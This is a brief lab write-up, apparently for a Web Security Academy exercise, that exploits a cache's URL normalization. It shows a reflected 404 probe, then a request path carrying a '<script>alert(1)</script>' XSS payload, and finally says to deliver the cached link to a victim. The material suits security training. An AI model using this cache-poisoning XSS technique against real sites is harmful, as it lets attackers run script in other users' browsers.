# **URL normalization**

Task: This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

Toolkit: BurpSuite, Browser

1. Send a req with URL encoded / and get 404

GET %2F HTTP/2  
Host: [0afc00d704d7c3b9803ba88b008800a5.web-security-academy.net](http://0afc00d704d7c3b9803ba88b008800a5.web-security-academy.net)

HTTP/2 404 Not Found  
Content-Type: text/html; charset=utf-8  
X-Frame-Options: SAMEORIGIN  
Cache-Control: max-age=10  
Age: 3  
X-Cache: hit  
Content-Length: 21

\<p\>Not Found: %2F\</p\>

2. send req with payload and watch the path in browser

GET %2F\<script\>alert(1)\</script\> HTTP/2  
Host: 0afc00d704d7c3b9803ba88b008800a5.web-security-academy.net

![][image1]

3. copy link and deliver to victim

SOLVED
